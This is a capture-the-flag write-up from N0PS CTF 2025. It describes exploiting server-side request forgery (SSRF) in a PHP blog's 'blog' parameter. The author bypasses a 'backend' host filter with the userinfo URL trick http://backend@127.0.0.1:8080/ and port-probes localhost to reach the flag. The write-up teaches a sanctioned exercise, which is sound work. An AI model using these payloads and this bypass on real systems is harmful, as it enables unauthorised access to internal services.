---
title: "N0PS CTF 2025 - Writeup"
summary: "A comprehensive write-up of the N0PS CTF 2025 by Team NOVA, sharing insights and solutions for various challenges tackled during the competition."
date: June 01 2025
draft: false
tags: 
  - Web
---

## WebTopia

###  Blog - That Blogged Too Hard

I landed on this simple-looking blog site — nothing too fancy, just three posts with titles like:

* *"How to deal with cuckroaches?"*
* *"My guide to cook chick"*
* *"A Desolate Cry for Help"*

A normal person might just read them.
But I'm in a CTF, so naturally, I tried to break it.

```json
[
  {"id":"1","title":"How to deal with cuckroages ?","name":"oggy"},
  {"id":"2","title":"My guide to cook chick","name":"sylvester"},
  {"id":"3","title":"A Desolate Cry for Help","name":"tom_the_cat"}
]
```

---

###  javaScript Spoils the Mystery

The frontend made it *way too easy* to see how things worked:

```js
fetch('/blog.php?blog=all')
```

&#x20;Clicking one sends:

```
/blog.php?blog=1
```

Clearly, some PHP backend is fetching blog data using that `blog` parameter. Time to mess with it.

---

###  Fuzzin’ and Breakin’

Sent in some spicy nonsense:

```
/blog.php?blog='"`{ ;$Foo}
```

And PHP screamed:

```php
Fatal error: curl_setopt(): cURL option must not contain any null bytes
```

Wait, **curl?**
This thing is making **server-side HTTP requests** to:

```php
curl_setopt($ch, CURLOPT_URL, 'backend/' . $blog);
```

This smells like **SSRF**.

---

### Confirming SSRF: The Fun Way

Tried a NoSQL-style input:

```
/blog.php?blog[$ne]=null
```

Got this gem:

```php
str_starts_with(): Argument #1 ($haystack) must be of type string, array given
```

Aha! It May be doing:

```php
if (str_starts_with($blog, "http://"))
```

Which means if the `blog` param starts with `http://`, it treats it as a **full URL** and passes it to `curl`.

Boom. We’re in SSRF town.

---

### But Then, the Filters

Tried:

```
/blog.php?blog=http://localhost/
```

And got hit with:

```
Warning: Request should only be sent to backend host.
```

Okay, so the site is *filtering* SSRF targets. Probably something like:

```php
if (!str_contains($url, 'backend')) {
  die("Warning: Request should only be sent to backend host.");
}
```

###  `/blog.php?blog=http://backend/`?

* No errors.
* But also **no output**.

Then I tried:

```
/blog.php?blog=http://backend/1
```

It returned the same content as:

```
/blog.php?blog=1
```

So the backend itself is mirroring the same data. Kinda boring, but useful confirmation.

---

### Now the Clever Bit: The \`\`\*\* Bypass\*\*

Tried:

```
/blog.php?blog=http://backend@127.0.0.1/
```

 No warning!
 SSRF request went through.
 Redirected to index page… something’s working…

---

###  Why Does `http://backend@127.0.0.1/` Work?

This is an old SSRF trick using **Basic Auth syntax** in URLs:

```plaintext
http://[username]@[host]/path
```

So `http://backend@127.0.0.1:8080/` is interpreted by the browser or curl (and PHP under the hood) as:

* `backend` = username
* `127.0.0.1:8080` = actual host

**The username is ignored** by the server if there's no password challenge.

✔ The filter sees `"backend"` in the string, so it passes
✔ But the actual request goes to `127.0.0.1:8080`

Classic SSRF bypass. You love to see it.

---

### Port-Scanning the Backyard

I hit all the classics:

```
/blog.php?blog=http://backend@127.0.0.1:5000/
/blog.php?blog=http://backend@127.0.0.1:8000/
/blog.php?blog=http://backend@127.0.0.1:1337/
```

Then:

```
/blog.php?blog=http://backend@127.0.0.1:8080/
```

🎉 Jackpot! 🎉

And staring back at me was:

```
N0PS{S5rF_1s_Th3_n3W_W4y}
```

---

### TL;DR

* Frontend calls `/blog.php?blog=all`, individual posts via ID
* Backend does:

  * `curl_setopt($ch, CURLOPT_URL, 'backend/' . $blog);`
  * Or, if it starts with `http://`, uses it as a full URL
* Localhost SSRF blocked with filter
* Tried:

  * `/blog.php?blog=http://backend/` → no output
  * `/blog.php?blog=http://backend/1` → same blog content as `/blog.php?blog=1`
* Bypassed filter with `http://backend@127.0.0.1:8080/`
* Port 8080 had the flag \`N0PS{S5rF\_1s\_Th3\_n3W\_W4y}\`

---

